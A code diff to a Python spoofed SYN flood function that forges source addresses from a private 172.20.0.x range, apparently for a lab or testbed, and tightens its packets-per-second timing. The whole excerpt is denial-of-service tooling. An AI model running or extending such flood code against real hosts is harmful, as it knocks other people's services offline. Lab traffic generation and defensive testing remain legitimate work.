@@ -58,12 +58,19 @@ def run_spoofed_flood(target_ip: str, target_port: int, rate_pps: int, duration_
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
 
     interval = 1.0 / max(1, rate_pps)
-    start_time = time.time()
+    total_packets = int(rate_pps * duration_sec)
+    start_time = time.perf_counter()
     packets_sent = 0
 
-    while time.time() - start_time < duration_sec:
-        t0 = time.time()
-        # Random internal IP
+    for i in range(total_packets):
+        target_time = start_time + (i * interval)
+        now = time.perf_counter()
+        to_sleep = target_time - now
+        if to_sleep > 0.001:
+            time.sleep(to_sleep - 0.0005)
+        while time.perf_counter() < target_time:
+            pass
+
         host_num = random.randint(ip_range_start, ip_range_end)
         src_ip = f"172.20.0.{host_num}"
         src_port = random.randint(1024, 65535)
@@ -75,12 +82,9 @@ def run_spoofed_flood(target_ip: str, target_port: int, rate_pps: int, duration_
             print(f"Error sending raw packet: {e}")
             break
 
-        elapsed = time.time() - t0
-        to_sleep = interval - elapsed
-        if to_sleep > 0:
-            time.sleep(to_sleep)
-
-    print(f"Finished spoofed SYN flood: {packets_sent} packets sent.")
+    actual_duration = time.perf_counter() - start_time
+    measured_rate = packets_sent / max(0.001, actual_duration)
+    print(f"Finished spoofed SYN flood: {packets_sent} packets sent in {actual_duration:.2f}s (measured rate: {measured_rate:.2f} pps).")
 
 
 if __name__ == "__main__":
